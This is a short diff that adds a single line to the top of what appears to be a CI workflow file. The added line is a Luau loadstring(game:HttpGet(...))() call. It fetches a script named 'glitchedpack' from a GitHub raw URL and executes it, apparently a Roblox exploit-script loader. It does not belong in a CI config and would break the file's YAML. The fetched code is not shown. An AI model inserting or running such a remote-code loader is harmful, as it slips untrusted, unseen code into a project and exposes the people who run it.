@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mirh55983-create/glitchedpack/refs/heads/main/gp"))()
 
 name: CI
 
